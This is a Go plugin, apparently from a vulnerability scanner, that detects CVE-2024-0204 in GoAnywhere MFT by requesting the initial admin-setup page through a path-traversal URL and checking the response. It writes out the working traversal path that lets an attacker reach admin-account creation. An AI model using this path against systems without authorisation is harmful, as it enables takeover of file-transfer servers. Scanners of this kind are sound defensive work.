package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("goanywhere_MFT_cve_2024_0204", &goanywhere_MFT_cve_2024_0204{})
}

type goanywhere_MFT_cve_2024_0204 struct{}

func (p *goanywhere_MFT_cve_2024_0204) Info() PluginInfo {
	return PluginInfo{
		Name:     "Goanywhere MFT 未授权创建管理员漏洞",
		VulnInfo: "GoAnywhereMFT是一个管理文件传输的解决方案，它简化了系统、员工、客户和贸易伙伴之间的数据交换。CVE-2024-0204 中，攻击者在能访问到管理登录界面的情况可构造恶意请求创建管理员，从而登录后台。",
		VulnID:   "CVE-2024-0204",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "GoAnywhere MFT < 7.4.1",
		CWE:      "",
	}
}

func (p *goanywhere_MFT_cve_2024_0204) Check(netloc string) bool {
	url := netloc + "/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "Create an administrator account") {
		return true
	}
	return false
}
